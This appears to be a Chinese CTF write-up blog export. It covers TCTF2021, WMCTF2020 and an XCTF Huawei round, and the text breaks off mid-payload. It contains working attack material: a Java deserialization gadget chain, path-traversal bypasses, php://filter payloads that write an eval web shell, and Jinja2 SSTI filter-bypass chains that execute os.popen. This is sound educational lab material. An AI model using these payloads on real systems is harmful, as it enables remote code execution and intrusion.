        Map hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Map lazyMap <span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>

        TiedMapEntry tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> rc<span class="token punctuation">)</span><span class="token punctuation">;</span>


        HashSet hashSet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashSet<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"c014"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Field fmap <span class="token operator">=</span> hashSet<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"map"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fmap<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        HashMap innimpl <span class="token operator">=</span> <span class="token punctuation">(</span>HashMap<span class="token punctuation">)</span> fmap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>hashSet<span class="token punctuation">)</span><span class="token punctuation">;</span>
        Field ftable <span class="token operator">=</span> hashMap<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"table"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ftable<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Object<span class="token punctuation">[</span><span class="token punctuation">]</span> nodes <span class="token operator">=</span><span class="token punctuation">(</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>ftable<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>innimpl<span class="token punctuation">)</span><span class="token punctuation">;</span>
        Object node <span class="token operator">=</span> nodes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        Field fnode <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fnode<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fnode<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> tiedMapEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> hashSet<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>这里额外讲一下这个<code>JMXServiceURL(&quot;service:jmx:rmi:///stub/&quot;+result);</code>，wp中的url为<code>service:jmx:rmi://host:port/stub/payload</code><br>而我们知道内网机器并不出网，因此host和port理论上是没有用的，而在host和port本身不存在的情况下还能使用，这就有点奇怪，为此专门搜了一下这个协议是什么情况<br><a href="https://blog.csdn.net/netyeaxi/article/details/72758409">JMXServiceURL使用说明</a><br>简单的说就是这个host和port在连接方是client的时候是完全没有用的，而是server的时候也没什么大用（所以为什么还要设计这个东西呢。。。）因此直接不填也没关系<br>而看到findRMIServer中的处理，其使用的path来自于<code>String path = directoryURL.getURLPath();</code>，而getURLPath()直接返回的就是port之后的全部内容，可以说是真的完全不看一眼前面是什么了。乱写也没事，就占个坑</p>
<p>神仙的wp<br><a href="https://hpdoger.cn/2021/10/08/title:%20TCTF2021-final-writeup-1/#bugglyloader">TCTF2021-final-writeup</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>文件包含</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>[WMCTF2020] wp</title>
    <url>/%5BWMCTF%5D%20wp.html</url>
    <content><![CDATA[<h1 id="WMCTF2020-wp"><a href="#WMCTF2020-wp" class="headerlink" title="[WMCTF2020] wp"></a>[WMCTF2020] wp</h1><p>看了两天题目，做出来的都是一开始的非预期，马上就上了一个打了补丁的v2.0然后不会做了呜呜呜，base64这题还是个phppwn，好不容易找到了.so文件还需要pwn爷爷去做，webweb代码审计看到头痛也看不出名堂，太菜了</p>
<h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>算不上题解，只能说是找到.so文件的步骤，呜呜呜</p>
<p>题目给了一个base64解码功能，简单测试之后发现当输入字符长度不是4的倍数，或者出现不能解码的字符的时候，就会把能解码的部分阶段解码返回，顺便输出一个看不懂的字符画(师傅说那个画的是’base64decodefail’)<br>查看源码可以看到一个hint，输入参数filename&#x3D;hint.php，得到</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$pwd</span><span class="token operator">=</span><span class="token string">"/var/www/html/hint/"</span>
</code></pre>
<p>同样用之前的测试思路，令filename&#x3D;&#x2F;hint.php，返回内容一致，证明拼接了目录，再使用..&#x2F;跳目录，回显不允许，可能限制了目录穿越，一开始以为是一个文件包含的，后来发现&#x2F;hint&#x2F;目录可以访问，并且hint目录下只有一个hint.php且访问得不到如下回显，故知道该功能实际上是读取文件并返回内容<br>测试目录穿越，发现使用filename&#x3D;aaa&#x2F;..&#x2F;hint.php仍然能够返回上述内容且无错误回显，则知道..并未被过滤，初步认定可能设置可读取目录为&#x2F;var&#x2F;www&#x2F;html&#x2F;hint&#x2F;，但师傅测试了一下..&#x2F;aaa&#x2F;hint.php发现仍未报错，这就很奇怪了，一时不知道是啥情况。<br>然后随便测试的时候试了一下filename&#x3D;&#x2F;..&#x2F;aaa&#x2F;..&#x2F;b64.php&#x2F;. 读到了源码，才知道是怎么进行判断的</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token keyword">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$decode_data</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">base64decode</span><span class="token punctuation">(</span><span class="token variable">$decode_data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">dir_count</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$depath</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$part</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$part</span> <span class="token operator">==</span> <span class="token string">'..'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$depath</span><span class="token operator">--</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$part</span> <span class="token operator">!=</span> <span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$depath</span><span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token variable">$depath</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">50</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"You're over the limit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/(flag)|(proc)|(self)|(maps)/i"</span><span class="token punctuation">,</span> <span class="token string">"w&amp;m"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">dir_count</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'./hint/'</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"You're over the limit"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>dir_count函数统计跳目录的次数和非跳目录的次数，知道了怎么回事之后就很容易绕过了，增加一大堆&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;就可以在不影响目录解析的情况下使得$depath++<br>不过到了这里也找不到攻击的点，因为这个正则写的很死，就是不给读flag，没法绕过</p>
<p>这里比较令人在意的就是那个base64解码函数，和平常用的标准函数名字有一点点出入，最重要的是输入输出会有奇怪的字符画返回，做到这一步的时候估计就是要去找那个.so文件然后做一个php的pwn题了</p>
<p>phpinfo看不见，就只能去找php.ini，按照默认的路径去找，还不知道PHP版本，只能一个个试，最后在<a href="http://base.wmctf.wetolink.com/b64.php?filename=///////../../../../../etc/php/7.2/apache2/php.ini">http://base.wmctf.wetolink.com/b64.php?filename=///////../../../../../etc/php/7.2/apache2/php.ini</a> 下面找到了php.ini，版本是7.2，拉到最下面，看见了一个叫做cfgoPHPExt_new.so的扩展文件，不和php.ini在一个文件夹下面，搜默认路径是什么，给了个&#x2F;usr&#x2F;lib&#x2F;php&#x2F;{编译日期}&#x2F;，后来发现每个版本的这个日期是一致的，起了一个docker，得到7.2的路径为<a href="http://base.wmctf.wetolink.com/b64.php?filename=../../../../usr/lib/php/20170718/cfgoPHPExt_new.so">http://base.wmctf.wetolink.com/b64.php?filename=../../../../usr/lib/php/20170718/cfgoPHPExt_new.so</a><br>字符刚刚好50个，出题人都算好了，事实上只要要访问的目录深度大于四，就可以直接跳到根目录然后再访问，完全不需要考虑dir_count函数的限制</p>
<p>然后题目到这就告一段落了，呜呜呜后面的都是pwn爷爷和re爷爷的工作，我也不懂<br>可能难度主要还是在逆向上面吧，毕竟感觉这个题目的前面半边的思路和其他的题目难度差距还是大了点</p>
<h2 id="web-checkin2-0"><a href="#web-checkin2-0" class="headerlink" title="web_checkin2.0"></a>web_checkin2.0</h2><p>这个题一开始被非预期了，后来就上了一个2.0版本</p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token comment" spellcheck="true">//PHP 7.0.33 Apache/2.4.25</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/var/www/html/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_REAL_IP'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/iconv|UCS|UTF|rot|quoted|base64/i'</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string">'&lt;?php exit();'</span><span class="token punctuation">.</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>需要绕过一下这个死亡exit，以前常见的做法就是使用伪协议进行绕过，把自己的payload编码，然后以解码的形式写入，凑一下字符，就可以毁坏这个exit进行getshell</p>
<p>PHP函数居然不分大小写（我现在才知道），所以toupper之类的方法并不能绕过exit，也可以用strip_tags来去除&lt;?php这个标记内的所有内容绕过exit，不过这里试了一下发现一用strip_tags就崩了，暂时作罢</p>
<p>但是这里常用编码都给过滤掉了，所以师傅使用强力的压缩算法进行绕过，先压缩，再将字符转小写，再解压缩，虽然不知道压缩是怎么回事，但是的确可以破坏exit，但是shell也被破坏了。。。然后就是硬凑时间，经过漫长的测试，发现将空格替换为换行符之后shell不会被损坏，得到如下payload</p>
<pre><code>php://filter/zlib.deflate|string.tolower|zlib.inflate/resource=?&gt;&lt;?php
eval($_GET[2]);?&gt;
</code></pre>
<p>可以自己试一试解码的结果<code>echo gzinflate(strtolower(gzdeflate(&quot;&lt;?php exit();&quot;.$content)));</code></p>
<pre><code>&lt;?php@�xit();php://fil|mr/zlib.lmfla|m|s|ring.|olowmr|zlib.infla|m/resourcg=?&gt;&lt;?php
eval($_GET[6]);?&gt;
</code></pre>
<p>可以看到原来的eval($_GET[2]);变成了eval($_GET[6]);，但是shell还是shell，还能用，resource后面写的</p>
<pre><code>?&gt;&lt;?php
eval($_GET[2]);?&gt;
</code></pre>
<p>就是文件名，包含一下getshell</p>
<h3 id="NULL-wp"><a href="#NULL-wp" class="headerlink" title="NULL wp"></a>NULL wp</h3><p>看了NULL的神仙的wp，思路类似不过似乎更优雅一些</p>
<pre><code>content=php://filter/write=string.strip_tags|zlib.inflate|%3F%3E%b3%b1%2f%c8%28%50%28%ae%2c%2e%49%cd%d5%50%89%77%77%0d%89%8e%8f%d5%b4%b6%b7%03%3C%3F/resource=123.php
</code></pre>
<p>filter中resource中不能出现不可见字符（大概）或者是文件名就不允许出现不可见字符？但允许filter里面使用不存在的过滤器，只会触发一个warning，所以null的师傅们将构造好的已经压缩过的shell写进了过滤器中，而不是像我们一样憨憨的在resource里面硬凑</p>
<p>但是strip_tags会引发某些版本PHP错误崩溃，所以这个payload一打就502，但是既然已经可以解压缩了，为什么不直接去掉strip_tags解压缩写一个shell进去呢，但是本地Windows尝试去掉strip_tags之后写文件会出一个Only 0 of 87 bytes written, possibly out of free disk space的warning，写不进去，还没搞清楚怎么回事（可能压缩文件需要特定的文件头才能解压缩吧）</p>
<p>null的师傅采取常见做法，在strip_tags使用时同时上传一堆shell，因为其引发PHP崩溃，所以上传文件以PHPxxxxxx的文件名遗留在tmp目录下，之后通过脚本硬爆破tmp目录下文件名getshell<br>好像这个思路还挺正统的，我都忘了这回事了呜呜呜呜</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>LFI</tag>
      </tags>
  </entry>
  <entry>
    <title>[XCTF]华为第一场</title>
    <url>/%5BXCTF%5D%E5%8D%8E%E4%B8%BA%E7%AC%AC%E4%B8%80%E5%9C%BA.html</url>
    <content><![CDATA[<h1 id="XCTF-华为第一场"><a href="#XCTF-华为第一场" class="headerlink" title="[XCTF]华为第一场"></a>[XCTF]华为第一场</h1><p>等我下午吃完饭去看题的时候，web差不多已经被师傅ak了，开始开心看题划水</p>
<h2 id="webshell-1"><a href="#webshell-1" class="headerlink" title="webshell_1"></a>webshell_1</h2><p>文件上传功能，传上去之后会发现后缀自动变jsp，需要传一个jsp的shell上去，但是好像有一定的过滤，完全不会jsp，网上搜的两个马都不能用，等会再说<br>一开始好像队友直接传了个网上的马就打通了，但是后来写wp复现的时候又打不通了<br>最后先上传了个读文件看了看waf，结果来了这么一句<code> URLConnection connection = new URL(&quot;http://hids.normalbe.com:8765/upload/jsp&quot;).openConnection();</code>意思是waf还是在线找的接口？<br>然后重新构造打过去了（但是我还是不会）</p>
<h2 id="mine1-1"><a href="#mine1-1" class="headerlink" title="mine1_1"></a>mine1_1</h2><p>简单扫雷游戏，先认真玩通关，会到一个success路由，有一个get参数msg，测一下ssti，1-1可变为0，过滤了<code>__&#39;&quot;[]</code>，不算多，不过感觉同时ban了下划线和方括号还挺难搞的<br>znj师傅使用了经典joiner操作配合request打通，request.args接受get参数，request.values接受post参数，request.cookies接受cookie<br>记一下payload</p>
<pre class=" language-python"><code class="language-python">
<span class="token punctuation">{</span><span class="token punctuation">{</span>joiner<span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>d<span class="token punctuation">)</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>d<span class="token punctuation">)</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>e<span class="token punctuation">)</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>f<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>

</code></pre>
<p>attr()函数的作用是获取值，|就是管道符，这一串就等价于<code>joiner[request.cookies.a][xxxxx]...</code><br>然后在cookie里面填payload，完全不受过滤影响，想干什么干什么了<br>不过还是记一下完整payload，毕竟我对SSTI的认知还停留在抄payload阶段<br><code>joiner.__init__.__globals__.__builtins__.__getitem__.eval.__import__(&#39;os&#39;).popen(&#39;cat f*&#39;).read()</code></p>
<h2 id="mine2"><a href="#mine2" class="headerlink" title="mine2"></a>mine2</h2><p>1的加强版，但是attr()|整个组合是真的无敌<br>attr里面的参数完全可以用字符串各种拼接绕过，使用超级格式化字符串绕过字符限制<br><code>(&quot;%c&quot;%(95))</code>这个样子取得下划线，95可以改成任意数字进行任意绕过，还能支持字符串加法拼接<br>还是也抄一下payload，虽然题是云的但是答案还是抄下来</p>
<pre class=" language-python"><code class="language-python">
<span class="token punctuation">{</span><span class="token operator">%</span><span class="token keyword">print</span><span class="token operator">%</span>0djoiner<span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token string">"init"</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token string">"lobals"</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token string">"etitem"</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">117</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token string">"iltins"</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token string">"etitem"</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token string">"impo"</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">114</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token string">"t"</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"popen"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token 